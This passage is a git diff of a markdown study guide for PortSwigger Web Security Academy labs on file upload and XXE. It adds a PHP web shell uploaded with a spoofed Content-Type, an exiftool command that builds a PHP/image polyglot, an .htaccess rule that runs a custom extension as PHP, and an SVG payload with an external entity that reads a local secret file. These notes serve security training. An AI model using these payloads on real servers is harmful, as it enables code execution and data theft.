@@ -1726,11 +1726,12 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 >A vulnerable image upload function or avatar logo upload, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.  
 
->***Identify*** any type of file upload.  
+>***Identify*** any type of file upload function.  
 
 ![Identify file upload](images/file-upload.png)  
 
->Content of exploit php 
+>A simple bypass technique is to specify **Content-Type** to value of ```image/jpeg``` and then uploading exploit.php file with the below payload. Content of exploit php will read the ```/home/carlos/secret``` sensitive information.  
+
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```  
@@ -1742,9 +1743,27 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 3. Create polygot using valid image file, and running the command: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. To view the extracted data, issue Get request to ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
 4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
   
+>Matching file upload vulnerable labs:  
+1. [PortSwigger Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)  
+2. [PortSwigger Lab: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)  
+3. [PortSwigger Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)  
+4. [PortSwigger Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)  
+  
 ![File upload stages](images/file-upload-stages.png)  
 
-[PortSwigger Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)  
+### XXE via SVG Image upload  
+
+>***Identify*** image upload on the blog post function accept **svg** images, and observe that the avatars already on blog source code is **svg** extensions.  
+
+>The content of the image.svg file uploaded:  
+
+```svg
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```  
+  
+![xxe svg upload file](images/xxe-svg-upload.png)  
+  
+[PortSwigger Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)  
   
 ## Deserialization  
 
